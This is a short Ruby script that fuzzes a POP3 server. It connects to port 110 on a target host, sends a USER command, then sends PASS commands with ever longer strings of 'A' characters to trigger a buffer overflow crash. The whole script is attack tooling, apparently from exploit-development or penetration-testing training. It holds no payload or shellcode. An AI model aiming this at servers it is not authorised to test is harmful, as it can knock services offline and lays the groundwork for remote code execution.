#!/usr/bin/env ruby
require 'socket'

#change hostname to your target
hostname = '127.0.0.1'
port = 110

buffer = ['A']
counter = 100

while buffer.length <= 30
        buffer.push 'A'*counter
        counter+=200
end

buffer.each do |str|
        puts 'Fuzzing PASS with %s bytes' %str.length
        s = TCPSocket.new(hostname, port)
        data = s.recv(1024)
        s.puts 'USER test\r\n'
        data = s.recv(1024)
        s.puts 'PASS ' + str
        s.close
end

puts 'Done!'
